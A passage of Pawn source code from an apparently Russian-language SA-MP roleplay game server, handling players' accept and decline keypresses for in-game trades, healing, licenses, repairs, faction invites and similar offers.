			DeletePVar(playerid,"SexID");
	    }
	    if(GetPVarInt(playerid,"Vl1") > 0)
	    {
			new Float:x,Float:y,Float:z;
			GetPlayerPos(playerid,x,y,z);
			if(!IsPlayerInRangeOfPoint(GetPVarInt(playerid,"VlID1"), 7.0, x,y,z))
			{
				SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
				SendClientMessage(GetPVarInt(playerid,"VlID1"),CGREY,"Вы не рядом с игроком");
				DeletePVar(playerid,"Vl1");
				DeletePVar(playerid,"VlID1");
				return true;
			}
			if(PlayerInfo[playerid][pCash] < 5000)
			{
				SendClientMessage(playerid,CGREY,"Недостаточно средств");
				SendClientMessage(GetPVarInt(playerid,"VlID1"),CGREY,"У Игрока недостаточно средств");
				DeletePVar(playerid,"Vl1");
				DeletePVar(playerid,"VlID1");
				return true;
			}
			if(GetPVarInt(GetPVarInt(playerid,"VlID1"),"HealP") > 0 && !IsPlayerInAnyVehicle(GetPVarInt(playerid,"VlID1")))
			{
			    DeletePVar(GetPVarInt(playerid,"VlID1"),"HealP");
			    if(IsPlayerAttachedObjectSlotUsed(GetPVarInt(playerid,"VlID1"), 1)) RemovePlayerAttachedObject(GetPVarInt(playerid,"VlID1"), 1);
			}
			GiveMoney(playerid,-5000);
			SendClientMessage(playerid,CREWARD,"Вы прошли курс от наркозависимости");
			if(PlayerInfo[playerid][pZavisimost] > 10) PlayerInfo[playerid][pZavisimost] -= 10;
			else PlayerInfo[playerid][pZavisimost] = 0;
			static const fmt_strin3g1[] = "Ваша наркозависимость: %d";
			new str3[sizeof(fmt_strin3g1)+MAX_PLAYER_NAME];
			format(str3, sizeof(str3), fmt_strin3g1,PlayerInfo[playerid][pZavisimost]);
			SendClientMessage(playerid,COLOR_PURPLE,str3);
			SendClientMessage(GetPVarInt(playerid,"VlID1"),CREWARD,"Игрок прошел курс от наркозависимости, деньги прибавлены к вашей зарплате");
			PlayerInfo[GetPVarInt(playerid,"VlID1")][pPayDay] += 50;
			DeletePVar(playerid,"Vl1");
			DeletePVar(playerid,"VlID1");
	    }
	    if(GetPVarInt(playerid,"Vl") > 0)
	    {
			new Float:x,Float:y,Float:z;
			GetPlayerPos(playerid,x,y,z);
			if(!IsPlayerInRangeOfPoint(GetPVarInt(playerid,"VlID"), 7.0, x,y,z))
			{
				SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
				SendClientMessage(GetPVarInt(playerid,"VlID"),CGREY,"Вы не рядом с игроком");
				DeletePVar(playerid,"Vl");
				DeletePVar(playerid,"VlCena");
				DeletePVar(playerid,"VlID");
				return true;
			}
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"VlCena"))
			{
				SendClientMessage(playerid,CGREY,"Недостаточно средств");
				SendClientMessage(GetPVarInt(playerid,"VlID"),CGREY,"У Игрока недостаточно средств");
				DeletePVar(playerid,"Vl");
				DeletePVar(playerid,"VlCena");
				DeletePVar(playerid,"VlID");
				return true;
			}
			SetHealth(playerid,100);
			if(GetPVarInt(GetPVarInt(playerid,"VlID"),"HealP") > 0 && !IsPlayerInAnyVehicle(GetPVarInt(playerid,"VlID")))
			{
			    DeletePVar(GetPVarInt(playerid,"VlID"),"HealP");
			    if(IsPlayerAttachedObjectSlotUsed(GetPVarInt(playerid,"VlID"), 1)) RemovePlayerAttachedObject(GetPVarInt(playerid,"VlID"), 1);
			}
			GiveMoney(playerid,-GetPVarInt(playerid,"VlCena"));
			SendClientMessage(playerid,CREWARD,"Вы вылечились");
			SendClientMessage(GetPVarInt(playerid,"VlID"),CREWARD,"Игрок вылечился, деньги прибавлены к вашей зарплате");
			PlayerInfo[GetPVarInt(playerid,"VlID")][pPayDay] += 30;
			if(!PlayerInfo[GetPVarInt(playerid,"VlID")][pQuestS][15])
			{
				PlayerQuest[GetPVarInt(playerid,"VlID")][15][0]++;
				CheckQuest(GetPVarInt(playerid,"VlID"),15);
			}
			PlayerInfo[playerid][pNHeal] = 0;
			DeletePVar(playerid,"Vl");
			DeletePVar(playerid,"VlCena");
			DeletePVar(playerid,"VlID");
	    }
	    if(GetPVarInt(playerid,"ChomeCena1") > 0)
	    {
			new Float:x,Float:y,Float:z;
			GetPlayerPos(GetPVarInt(playerid,"ChomeID1"),x,y,z);
			if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
			{
				SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
				SendClientMessage(GetPVarInt(playerid,"ChomeID1"),CGREY,"Вы не рядом с игроком");
				DeletePVar(playerid,"ChomeCena1");
				DeletePVar(playerid,"ChomeID1");
				return true;
			}
			if(GetPlayerHouse(playerid))
			{
		 		SendClientMessage(GetPVarInt(playerid,"ChomeID1"),CGREY,"У Игрока есть дом");
		 		SendClientMessage(playerid,CGREY,"У Вас уже есть дом");
				DeletePVar(playerid,"ChomeCena1");
				DeletePVar(playerid,"ChomeID1");
				return true;
		 	}
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"ChomeCena1"))
			{
				SendClientMessage(playerid,CGREY,"Недостаточно средств");
	 			SendClientMessage(GetPVarInt(playerid,"ChomeID1"),CGREY,"У Игрока недостаточно средств");
				DeletePVar(playerid,"ChomeCena1");
				DeletePVar(playerid,"ChomeID1");
				return true;
			}
			static const fmt_string2[] = "{FFFFFF}Вы действительно хотите обменять свой дом?\nВы получите:{f7ae11}\nДом №%i(%s класса){FFFFFF}\nОтдадите:\n{f7ae11}$%i";
			new str2[sizeof(fmt_string2)+32+10];
			format(str2, sizeof(str2), fmt_string2,GetPVarInt(GetPVarInt(playerid,"ChomeID"),"PlayerHouse"),HInfo[GetPVarInt(GetPVarInt(playerid,"ChomeID"),"PlayerHouse")][hClass] ,GetPVarInt(playerid,"ChomeCena") );
			ShowPlayerDialog(playerid,126,DIALOG_STYLE_MSGBOX,"Покупка дома",str2,"Да","Нет");
	    }
	    if(GetPVarInt(playerid,"ChomeCena") > 0)
	    {
			new Float:x,Float:y,Float:z;
			GetPlayerPos(GetPVarInt(playerid,"ChomeID"),x,y,z);
			if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
			{
				SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
				SendClientMessage(GetPVarInt(playerid,"ChomeID"),CGREY,"Вы не рядом с игроком");
				DeletePVar(playerid,"ChomeCena");
				DeletePVar(playerid,"ChomeID");
				return true;
			}
			if(!GetPlayerHouse(GetPVarInt(playerid,"ChomeID")))
			{
		 		SendClientMessage(playerid,CGREY,"У Игрока нет дома");
		 		SendClientMessage(GetPVarInt(playerid,"ChomeID"),CGREY,"У Вас нет дома");
				DeletePVar(playerid,"ChomeCena");
				DeletePVar(playerid,"ChomeID");
				return true;
		 	}
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"ChomeCena"))
			{
				SendClientMessage(playerid,CGREY,"Недостаточно средств");
	 			SendClientMessage(GetPVarInt(playerid,"ChomeID"),CGREY,"У Игрока недостаточно средств");
				DeletePVar(playerid,"ChomeCena");
				DeletePVar(playerid,"ChomeID");
				return true;
			}
			static const fmt_string2[] = "{FFFFFF}Вы действительно хотите обменять свой дом?\nВы получите:{f7ae11}\nДом №%i(%s класса){FFFFFF}\nОтдадите:\n{f7ae11}$%i\nДом №%i(%s класса)";
			new str2[sizeof(fmt_string2)+32+10];
			format(str2, sizeof(str2), fmt_string2,GetPVarInt(GetPVarInt(playerid,"ChomeID"),"PlayerHouse"),HInfo[GetPVarInt(GetPVarInt(playerid,"ChomeID"),"PlayerHouse")][hClass] ,GetPVarInt(playerid,"ChomeCena"),GetPVarInt(playerid,"PlayerHouse"),HInfo[GetPVarInt(playerid,"PlayerHouse")][hClass] );
			ShowPlayerDialog(playerid,114,DIALOG_STYLE_MSGBOX,"Обмен дома",str2,"Да","Нет");
	    }
	    if(GetPVarInt(playerid,"ObmEx") > 0)
	    {
	        new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"ObmExP"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(GetPVarInt(playerid,"ObmExP"), 5.0, x,y,z))
   			{
			  SendClientMessage(GetPVarInt(playerid,"ObmExP"),CGREY,"Вы не рядом с игроком");
			  SendClientMessage(playerid,CGREY,"Игрок не рядом с вами");
			  DeletePVar(playerid,"ObmExP");
			  DeletePVar(playerid,"ObmEx");
			  return true;
			}
			GiveEx(GetPVarInt(playerid,"ObmExP"),playerid);
			DeletePVar(playerid,"ObmExP");
	  		DeletePVar(playerid,"ObmEx");
	    }
	    if(GetPVarInt(playerid,"LicP") > 0)
	    {
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"LicCena"))
  			{
			  SendClientMessage(GetPVarInt(playerid,"LicID"),CGREY,"У Игрока недостаточно средств");
			  SendClientMessage(playerid,CGREY,"Недостаточно средств");
			  DeletePVar(playerid,"LicP");
			  DeletePVar(playerid,"LicID");
			  DeletePVar(playerid,"LicCena");
			  DeletePVar(playerid,"Lic");
			  return true;
			}
   			new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"LicID"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(GetPVarInt(playerid,"LicID"), 5.0, x,y,z))
   			{
			  SendClientMessage(GetPVarInt(playerid,"LicID"),CGREY,"Вы не рядом с игроком");
			  SendClientMessage(playerid,CGREY,"Игрок не рядом с вами");
			  DeletePVar(playerid,"LicP");
			  DeletePVar(playerid,"LicID");
			  DeletePVar(playerid,"LicCena");
			  DeletePVar(playerid,"Lic");
			  return true;
			}
			new bab = GetPVarInt(playerid,"LicCena")*10/100;
			GiveMoney(playerid,-GetPVarInt(playerid,"LicCena"));
			PlayerInfo[GetPVarInt(playerid,"LicID")][pPayDay] += bab;
			PlayerInfo[playerid][pLic][GetPVarInt(playerid,"Lic")] = 1;
			PlayerInfo[playerid][pLicTime][GetPVarInt(playerid,"Lic")] = gettime()+60*60*24*90;
			GiveInv(playerid,449,1);
			static const fmt_string2[] = "Игрок купил лицензию. К вашей зарплате прибавлено $%i";
			new str2[sizeof(fmt_string2)+5];
			format(str2, sizeof(str2), fmt_string2,bab);
	  		SendClientMessage(GetPVarInt(playerid,"LicID"),CREWARD,str2);
	  		SendClientMessage(playerid,CREWARD,"Вы приобрели лицензию");
	  		Kazna += GetPVarInt(playerid,"LicCena")*30/100;
			SetMatsInt("kazna",Kazna);
	  		DeletePVar(playerid,"LicP");
			DeletePVar(playerid,"LicID");
			DeletePVar(playerid,"LicCena");
			DeletePVar(playerid,"Lic");
	    }
        if(GetPVarInt(playerid,"ObmCena") > 0)
	    {
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"ObmCena"))
  			{
			  SendClientMessage(GetPVarInt(playerid,"ObmID"),CGREY,"У Игрока недостаточно средств");
			  SendClientMessage(playerid,CGREY,"Недостаточно средств");
			  DeletePVar(playerid,"ObmID");
			  DeletePVar(playerid,"ObmCar");
			  DeletePVar(playerid,"ObmCar1");
			  DeletePVar(playerid,"ObmCena");
			  return true;
			}
		   	if(GetPlayerState(GetPVarInt(playerid,"ObmID")) != 2)
  			{
			  SendClientMessage(GetPVarInt(playerid,"ObmID"),CGREY,"Вы не в машине");
			  SendClientMessage(playerid,CGREY,"Игрок не в машине");
			  DeletePVar(playerid,"ObmID");
			  DeletePVar(playerid,"ObmCar");
			  DeletePVar(playerid,"ObmCar1");
			  DeletePVar(playerid,"ObmCena");
			  return true;
			}
		   	new kek = 0;
			for(new v = 1; v <= TOTALV; v++)
			{
			    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
				if(GetPlayerVehicleID(GetPVarInt(playerid,"ObmID")) == VInfo[v][vcar])
				{
		  			if(strcmp(VInfo[v][vname], PlayerInfo[GetPVarInt(playerid,"ObmID")][pSendername], true) == 0) kek = v;
				}
			}
			if(kek == 0)
  			{
			  SendClientMessage(GetPVarInt(playerid,"ObmID"),CGREY,"Вы не в своем транспортном средстве");
			  SendClientMessage(playerid,CGREY,"Игрок не в своем транспортном средстве");
			  DeletePVar(playerid,"ObmID");
			  DeletePVar(playerid,"ObmCar");
			  DeletePVar(playerid,"ObmCar1");
			  DeletePVar(playerid,"ObmCena");
			  return true;
			}
			if(GetPlayerVehicleID(playerid) != GetPVarInt(playerid,"ObmCar1"))
			{
			  SendClientMessage(GetPVarInt(playerid,"ObmID"),CGREY,"Игрок не в своем транспортном средстве");
			  SendClientMessage(playerid,CGREY,"Вы не в своем транспортном средстве");
			  DeletePVar(playerid,"ObmID");
			  DeletePVar(playerid,"ObmCar");
			  DeletePVar(playerid,"ObmCar1");
			  DeletePVar(playerid,"ObmCena");
			  return true;
			}
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"ObmID"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(GetPVarInt(playerid,"ObmID"), 15.0, x,y,z))
   			{
			  SendClientMessage(GetPVarInt(playerid,"ObmID"),CGREY,"Вы не рядом с игроком");
			  SendClientMessage(playerid,CGREY,"Игрок не рядом с вами");
			  DeletePVar(playerid,"ObmID");
			  DeletePVar(playerid,"ObmCar");
			  DeletePVar(playerid,"ObmCar1");
			  DeletePVar(playerid,"ObmCena");
			  return true;
			}
			static const fmt_string2[] = "{FFFFFF}Вы действительно хотите обменяться транспортом с  игроком?\nВы получите:{f7ae11}\n%s{FFFFFF}\nОтдадите:\n{f7ae11}$%i\n%s";
			new str2[sizeof(fmt_string2)+32+10];
			format(str2, sizeof(str2), fmt_string2,VehicleNameS[GetVehicleModel(GetPlayerVehicleID(GetPVarInt(playerid,"ObmID")))-400],GetPVarInt(playerid,"ObmCena"),VehicleNameS[GetVehicleModel(GetPlayerVehicleID(playerid))-400]);
			ShowPlayerDialog(playerid,89,DIALOG_STYLE_MSGBOX,"Обмен транспорта",str2,"Да","Нет");
	    }
	    if(GetPVarInt(playerid,"PradCena") > 0)
	    {
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"PradCena"))
  			{
			  SendClientMessage(GetPVarInt(playerid,"PradID"),CGREY,"У Игрока недостаточно средств");
			  SendClientMessage(playerid,CGREY,"Недостаточно средств");
			  DeletePVar(playerid,"PradID");
			  DeletePVar(playerid,"PradCena");
			  return true;
			}
		   	if(GetPlayerState(GetPVarInt(playerid,"PradID")) != 2)
  			{
			  SendClientMessage(GetPVarInt(playerid,"PradID"),CGREY,"Вы не в машине");
			  SendClientMessage(playerid,CGREY,"Игрок не в машине");
			  DeletePVar(playerid,"PradID");
			  DeletePVar(playerid,"PradCena");
			  return true;
			}
			new kek1 = 0;
           	for(new i = 1; i<= TOTALV; i++)
   			{
   			    if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
				if(strcmp(VInfo[i][vname], PlayerInfo[playerid][pSendername], true) == 0) kek1++;
			}
            if(!PlayerInfo[playerid][pDCar] && kek1 == 1)
			{
				SendClientMessage(GetPVarInt(playerid,"PradID"),CGREY,"Игрок не может иметь ещё транспорт");
				SendClientMessage(playerid,CGREY,"Вы не можете иметь больше 2 транспротных средств");
				DeletePVar(playerid,"PradID");
				DeletePVar(playerid,"PradCena");
				return true;
			}
           	if(kek1 == 2 && PlayerInfo[playerid][pDCar] < 2)
   			{
				SendClientMessage(GetPVarInt(playerid,"PradID"),CGREY,"Игрок не может иметь ещё транспорт");
				SendClientMessage(playerid,CGREY,"Вы не можете иметь больше 2 транспротных средств");
				DeletePVar(playerid,"PradID");
				DeletePVar(playerid,"PradCena");
				return true;
		  	}
	  		if(kek1 == 3)
   			{
				SendClientMessage(GetPVarInt(playerid,"PradID"),CGREY,"Игрок не может иметь ещё транспорт");
				SendClientMessage(playerid,CGREY,"Вы не можете иметь больше 3 транспротных средств");
				DeletePVar(playerid,"PradID");
				DeletePVar(playerid,"PradCena");
				return true;
		  	}
		   	new kek = 0;
			for(new v = 1; v <= TOTALV; v++)
			{
			    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
				if(GetPlayerVehicleID(GetPVarInt(playerid,"PradID")) == VInfo[v][vcar])
				{
		  			if(strcmp(VInfo[v][vname], PlayerInfo[GetPVarInt(playerid,"PradID")][pSendername], true) == 0) kek = v;
				}
			}
			if(kek == 0)
  			{
			  SendClientMessage(GetPVarInt(playerid,"PradID"),CGREY,"Вы не с своем транспортном средстве");
			  SendClientMessage(playerid,CGREY,"Игрок не в своем транспортном средстве");
			  DeletePVar(playerid,"PradID");
			  DeletePVar(playerid,"PradCena");
			  return true;
			}
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"PradID"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(GetPVarInt(playerid,"PradID"), 5.0, x,y,z))
   			{
			  SendClientMessage(GetPVarInt(playerid,"PradID"),CGREY,"Вы не рядом с игроком");
			  SendClientMessage(playerid,CGREY,"Игрок не рядом с вами");
			  DeletePVar(playerid,"PradID");
			  DeletePVar(playerid,"PradCena");
			  return true;
			}
			static const fmt_string2[] = "{FFFFFF}Вы действительно хотите купить транспорт у  игрока?\nВы получите:{f7ae11}\n%s{FFFFFF}\nОтдадите:\n{f7ae11}$%i";
			new str2[sizeof(fmt_string2)+32+10];
			format(str2, sizeof(str2), fmt_string2,VehicleNameS[GetVehicleModel(GetPlayerVehicleID(GetPVarInt(playerid,"PradID")))-400],GetPVarInt(playerid,"PradCena"));
			ShowPlayerDialog(playerid,87,DIALOG_STYLE_MSGBOX,"Продажа транспорта",str2,"Да","Нет");
	    }
		if(GetPVarInt(playerid,"Rep") > 0)
			{
			    if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"RepCena"))
			    {
  					SendClientMessage(playerid,CGREY,"Недостачтоно средств");
					SendClientMessage(GetPVarInt(playerid,"RepID"),CGREY,"У Игрока недостаточно средств");
					DeletePVar(playerid,"Rep");
					DeletePVar(playerid,"RepID");
					DeletePVar(playerid,"RepCena");
					return true;
			    }
				new Float:x,Float:y,Float:z;
				new Float:CarPos[3];
				GetPlayerPos(playerid,x,y,z);
				if(!IsPlayerInRangeOfPoint(playerid, 7.0, x,y,z))
				{
					SendClientMessage(playerid,CGREY,"Механик не рядом с вами");
					SendClientMessage(GetPVarInt(playerid,"RepID"),CGREY,"Вы не рядом с игроком");
					DeletePVar(playerid,"Rep");
					DeletePVar(playerid,"RepID");
					DeletePVar(playerid,"RepCena");
					return true;
				}
				if(GetPlayerState(playerid) != 2)
				{
					SendClientMessage(playerid,CGREY,"Вы должены быть на водительском сидении");
					SendClientMessage(GetPVarInt(playerid,"RepID"),CGREY,"Игрок должен быть на водительском сидении");
					DeletePVar(playerid,"Rep");
					DeletePVar(playerid,"RepID");
					DeletePVar(playerid,"RepCena");
					return true;
				}
				GetCoordBonnetVehicle(GetPlayerVehicleID(playerid),CarPos[0],CarPos[1],CarPos[2]);
				if(!IsPlayerInRangeOfPoint(playerid,5.0,CarPos[0],CarPos[1],CarPos[2]))
				{
					SendClientMessage(playerid,CGREY,"Механик не рядом с капотом");
					SendClientMessage(GetPVarInt(playerid,"RepID"),CGREY,"Вы не рядом с капотом");
					DeletePVar(playerid,"Rep");
					DeletePVar(playerid,"RepID");
					DeletePVar(playerid,"RepCena");
					return true;
				}
				TogglePlayerControllable(playerid,0);
				SetEngine(playerid,GetPlayerVehicleID(playerid),false);
	//			GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
	//			SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,VEHICLE_PARAMS_ON,boot,objective);
				SetPVarInt(GetPVarInt(playerid,"RepID"),"ChID",playerid);
				SetPlayerAttachedObject(GetPVarInt(playerid,"RepID"), 1, 18635, 5, 0.036999, 0.071999, 0.000000, 155.000000, 0.000000, 0.000000, 1.000000, 1.00, 1.000000);
				SetPVarInt(GetPVarInt(playerid,"RepID"),"Vzlom",2);
				
				StartGame(GetPVarInt(playerid,"RepID"));
		  		static const fmt_string[] = "%s чинит машину";
				new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
				format(str, sizeof(str), fmt_string,PlayerInfo[GetPVarInt(playerid,"RepID")][pSendername]);
				ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
				SetPlayerChatBubble(playerid, "чинит машину", COLOR_PURPLE, 30.0, 7000);
				ApplyAnimation(GetPVarInt(playerid,"RepID"), "OTB", "BETSLP_LOOP", 4.1, 1, 0, 0, 0, 0);
				DeletePVar(playerid,"Rep");
				DeletePVar(playerid,"RepID");
			}
		if(GetPVarInt(playerid,"Buks") > 0)
	    	{
			new Float:CarPos[3];
			if(GetPlayerState(playerid) != 3)
			{
				SendClientMessage(playerid,CGREY,"Вы должены быть за пассажирском сидении");
 				SendClientMessage(GetPVarInt(playerid,"BuksID"),CGREY,"Игрок должен быть за пассажирском сидении");
				DeletePVar(playerid,"Buks");
				DeletePVar(playerid,"BuksID");
				return true;
			}
			new kek = 0;
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
			    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
				if(GetPlayerVehicleID(i) == GetPlayerState(playerid) && GetPlayerState(i) == 2) kek ++;
			}
			if(kek > 0)
			{
				SendClientMessage(playerid,CGREY,"За рулём транспорта никого не должно быть");
 				SendClientMessage(GetPVarInt(playerid,"BuksID"),CGREY,"За рулём транспорта никого не должно быть");
				DeletePVar(playerid,"Buks");
				DeletePVar(playerid,"BuksID");
				return true;
			}
			GetCoordBonnetVehicle(GetPlayerVehicleID(playerid),CarPos[0],CarPos[1],CarPos[2]);
			if(!IsPlayerInRangeOfPoint(GetPVarInt(playerid,"BuksID"),7.0,CarPos[0],CarPos[1],CarPos[2]))
			{
 				SendClientMessage(playerid,CGREY,"Механик не рядом с каптом");
 				SendClientMessage(GetPVarInt(playerid,"BuksID"),CGREY,"Вы не рядом с каптом");
				DeletePVar(playerid,"Buks");
				DeletePVar(playerid,"BuksID");
				return true;
		 	}
	        AttachTrailerToVehicle(GetPlayerVehicleID(playerid), GetPlayerVehicleID(GetPVarInt(playerid,"BuksID")));
			DeletePVar(playerid,"Buks");
			DeletePVar(playerid,"BuksID");
	    }
		if(GetPVarInt(playerid,"GunCena") > 0)
		{
		    if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"GunCena"))
		    {
		        SendClientMessage(playerid,CGREY,"Недостаточно средств");
		        SendClientMessage(GetPVarInt(playerid,"GunID"),CGREY,"У игрока недостаточно средств");
				DeletePVar(playerid,"GunID");
				DeletePVar(playerid,"GunM");
				DeletePVar(playerid,"GunPT");
				DeletePVar(playerid,"GunCena");
				return true;
		    }
		    PlayerInfo[GetPVarInt(playerid,"GunID")][pMats] -= GetPVarInt(playerid,"GunM")*GetPVarInt(playerid,"GunPT")/5;
		    InvMinus(playerid,447,GetPVarInt(playerid,"GunM")*GetPVarInt(playerid,"GunPT")/5);
		    GivePlayerWeapon(playerid,GetPVarInt(playerid,"GunM"),GetPVarInt(playerid,"GunPT"));
	    	static const fmt_string[] = "%s сделал оружие из материалов и передал его %s";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+64];
			format(str, sizeof(str), fmt_string,PlayerInfo[GetPVarInt(playerid,"GunID")][pSendername],PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
			SetPlayerChatBubble(playerid, "сделал оружие из материалов и передал его", COLOR_PURPLE, 30.0, 7000);
			DeletePVar(playerid,"GunID");
			DeletePVar(playerid,"GunM");
			DeletePVar(playerid,"GunPT");
			DeletePVar(playerid,"GunCena");
		    
		}
		if(GetPVarInt(playerid,"Inv") > 0)
		{
		    PlayerInfo[playerid][pMember] = PlayerInfo[GetPVarInt(playerid,"InvID")][pMember];
		    PlayerInfo[playerid][pRank] = 1;
		    if(GetPVarInt(playerid,"Nachalo") == 1)
		    {
		    	new text[5];
				if(IsAGang(playerid) || IsAMafia(playerid)) text = "[F]";
				else text = "[R]";
		    	static const fmt_string2[] = "%s %s пригласил %s";
				new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+4];
				format(str2, sizeof(str2), fmt_string2,text,PlayerInfo[GetPVarInt(playerid,"InvID")][pSendername],PlayerInfo[playerid][pSendername]);
				SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str2);
				static const fmt_str[] = "Теперь вы в организации \"%s\"";
				new str[sizeof(fmt_str)+50];
	   			format(str, sizeof(str), fmt_str,FracInfo[PlayerInfo[playerid][pMember]][fName]);
	   			SendClientMessage(playerid,CREWARD,str);
	   			DeletePVar(playerid,"Nachalo");
   			}
   			if(IsAMafia(playerid) || IsAGang(playerid))
			{
			    SetColor(playerid);
			    SetPlayerSkin(playerid,(PlayerInfo[playerid][pSex] == 1)? (FracInfo[PlayerInfo[playerid][pMember]][fMSkin][PlayerInfo[playerid][pRank]-1]) : (FracInfo[PlayerInfo[playerid][pMember]][fWSkin]));
			}
			PlayerInfo[playerid][pSpawnChange] = 1;
			SetPlayerInt(PlayerInfo[playerid][pSendername],"member",PlayerInfo[playerid][pMember]);
			SetPlayerInt(PlayerInfo[playerid][pSendername],"rank",PlayerInfo[playerid][pRank]);
			PlayerInfo[playerid][pVipis] = 0;
			SendClientMessage(GetPVarInt(playerid,"InvID"),COLOR_PURPLE,"Игрок теперь в Вашей организации");
			if(!PlayerInfo[playerid][pQuestS][8])
			{
				PlayerQuest[playerid][8][0]++;
				CheckQuest(playerid,8);
			}
			if(IsAGang(playerid) || IsAMafia(playerid))
			{
				if(CaptInfo[PlayerInfo[playerid][pMember]-6][capture]) CaptGo(playerid);
			}
   			DeletePVar(playerid,"Inv");
   			DeletePVar(playerid,"InvID");
		}
	}
	if(newkeys & KEY_NO)
	{
	    if(GetPVarInt(playerid,"Zvarova") > 0)
	    {
	        SendClientMessage(playerid,-1,"Вы отказались от предложения подзадроваться");
			SendClientMessage(GetPVarInt(playerid,"Zvarova"),-1,"Игрок отказался от предложения поздароваться с Вами");
			DeletePVar(playerid,"Zvarova");
		}
		if(GetPVarInt(playerid,"Pod"))
		{
		    SendClientMessage(playerid,GetPVarInt(playerid,"PodID"),"Игрок отказался от участия в ограблении");
		    DeletePVar(playerid,"PodID");
		    DeletePVar(playerid,"PodSlot");
		    DeletePVar(playerid,"Pod");
			return SendClientMessage(playerid,CGREY,"Вы отказались от участия в ограблении");
		}
	    if(GetPVarInt(playerid,"Sem") > 0)
	    {
			SendClientMessage(playerid,-1,"Вы отказались от вступления в семью");
			SendClientMessage(GetPVarInt(playerid,"SemID"),-1,"Игрок отказался от вступления в семью");
			DeletePVar(playerid,"Sem");
			DeletePVar(playerid,"SemID");
	    }
		if(GetPVarInt(playerid,"Dice") > 0)
	    {
			SendClientMessage(playerid,-1,"Вы отказались от игры в кости");
			SendClientMessage(GetPVarInt(playerid,"DiceID"),-1,"Игрок отказался от игры в кости");
			DeletePVar(playerid,"Dice");
			DeletePVar(playerid,"DiceID");
			DeletePVar(playerid,"DiceCena");
	    }
   		if(GetPVarInt(playerid,"Upr") > 0)
	    {
			SendClientMessage(playerid,-1,"Вы отказались от управления бизнеса");
			SendClientMessage(GetPVarInt(playerid,"UprID"),-1,"Игрок отказался от управления бизнеса");
			DeletePVar(playerid,"Upr");
			DeletePVar(playerid,"UprID");
	    }
	    if(GetPVarInt(playerid,"Podsel") > 0)
	    {
			SendClientMessage(playerid,-1,"Вы отказались от подселения");
			SendClientMessage(GetPVarInt(playerid,"PodselID"),-1,"Игрок отказался от подселения");
			DeletePVar(playerid,"Podsel");
			DeletePVar(playerid,"PodselID");
	    }
 		if(GetPVarInt(playerid,"SellDrugsCena2") > 0)
	    {
			SendClientMessage(playerid,-1,"Вы отказались от покупки наркотиков");
			SendClientMessage(GetPVarInt(playerid,"SellDrugsID2"),-1,"Игрок отказался от покупки наркотиков");
			DeletePVar(playerid,"SellDrugsID2");
			DeletePVar(playerid,"SellDrugsCena2");
			DeletePVar(playerid,"SellDrugs2");
		}
		if(GetPVarInt(playerid,"Adv") > 0)
		{
            SendClientMessage(playerid,-1,"Вы отказались от выхода из тюрьмы");
			SendClientMessage(GetPVarInt(playerid,"AdvID"),-1,"Игрок отказался от выхода из тюрьмы");
			DeletePVar(playerid,"Adv");
			DeletePVar(playerid,"AdvCena");
			DeletePVar(playerid,"AdvID");
			DeletePVar(playerid,"AdvStat");
		}
		if(GetPVarInt(playerid,"Vl1") > 0)
	    {
            SendClientMessage(playerid,-1,"Вы отказались от лечения");
			SendClientMessage(GetPVarInt(playerid,"VlID1"),-1,"Игрок отказался от лечения");
			DeletePVar(playerid,"Vl1");
			DeletePVar(playerid,"VlID1");
	    }
	    if(GetPVarInt(playerid,"Vl") > 0)
	    {
            SendClientMessage(playerid,-1,"Вы отказались от лечения");
			SendClientMessage(GetPVarInt(playerid,"VlID"),-1,"Игрок отказался от лечения");
			DeletePVar(playerid,"Vl");
			DeletePVar(playerid,"VlCena");
			DeletePVar(playerid,"VlID");
	    }
	    if(GetPVarInt(playerid,"Sex") > 0)
	    {
            SendClientMessage(playerid,-1,"Вы отказались от смены пола");
			SendClientMessage(GetPVarInt(playerid,"SexID"),-1,"Игрок отказался от смены пола");
			DeletePVar(playerid,"Sex");
			DeletePVar(playerid,"SexID");
	    }
	    if(GetPVarInt(playerid,"CbizCena") > 0)
		{
			SendClientMessage(playerid,-1,"Вы отказались от обмена бизнесами");
			SendClientMessage(GetPVarInt(playerid,"CbizID"),-1,"Игрок отказался от обмена");
			DeletePVar(playerid,"CbizCena");
			DeletePVar(playerid,"CbizID");
			return true;
		}
	    if(GetPVarInt(playerid,"ChomeCena") > 0)
		{
			SendClientMessage(playerid,-1,"Вы отказались от обмена домами");
